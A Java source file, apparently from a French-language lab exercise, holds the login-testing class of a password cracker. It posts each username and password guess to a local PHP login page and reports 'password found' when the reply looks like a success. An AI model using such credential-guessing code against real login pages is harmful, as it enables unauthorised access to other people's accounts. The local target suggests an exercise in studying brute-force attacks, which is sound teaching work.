import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class LigneCible implements cibleFactory {

    public boolean connexion(String login, String password) {
        try {
            URL url = new URL("http://localhost/Cible_Crack/login.php");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setRequestProperty("Accept-Charset", "UTF-8");

            String body = "username=" + URLEncoder.encode(login, "UTF-8") +
                          "&password=" + URLEncoder.encode(password, "UTF-8");

            OutputStream os = con.getOutputStream();
            os.write(body.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();

            int status = con.getResponseCode();

            // Lire la réponse avec encodage UTF-8
            BufferedReader in = new BufferedReader(new InputStreamReader(
                status >= 200 && status < 400 ? con.getInputStream() : con.getErrorStream(),
                StandardCharsets.UTF_8
            ));

            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
            in.close();

            String responseStr = response.toString().toLowerCase();
            
            // Debug pour voir ce qui est reçu (à retirer après tests)
            System.out.println("[DEBUG] Testing " + login + ":" + password);
            System.out.println("[DEBUG] Status: " + status);
            System.out.println("[DEBUG] Response contains 'connexion reussie': " + responseStr.contains("connexion reussie"));
            System.out.println("[DEBUG] Response contains 'échec': " + responseStr.contains("échec"));

            // Méthodes de détection multiples
            boolean hasSuccess = responseStr.contains("connexion reussie") ||
                               responseStr.contains("connexion réussie") ||
                               responseStr.contains("redirection en cours");
            
            boolean hasError = responseStr.contains("échec de la connexion") ||
                             responseStr.contains("echec de la connexion") ||
                             responseStr.contains("nom d'utilisateur ou mot de passe incorrect");

            // Succès = message de succès présent OU (pas de message d'erreur ET status OK)
            boolean isSuccess = hasSuccess || (!hasError && status == 200);
            
            if (isSuccess) {
                System.out.println("*** MOT DE PASSE TROUVÉ: " + password + " ***");
            }

            return isSuccess;

        } catch (Exception e) {
            System.err.println("Erreur de connexion vers l'API : " + e.getMessage());
            return false;
        }
    }
}